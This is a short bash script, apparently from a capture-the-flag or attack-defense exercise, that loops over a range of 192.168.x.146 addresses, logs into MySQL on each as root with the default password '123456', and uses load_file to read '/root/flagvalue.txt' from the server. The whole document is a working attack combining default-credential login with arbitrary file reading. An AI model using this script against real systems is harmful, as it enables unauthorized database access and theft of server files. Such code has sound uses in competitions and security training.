for((i=100;i<=160;i=i+1))
do
	ip="192.168."$i".146"
	echo $ip
	timeout 0.1 mysql -uroot -h$ip -p123456 <<eof
select load_file('/root/flagvalue.txt')
eof
done
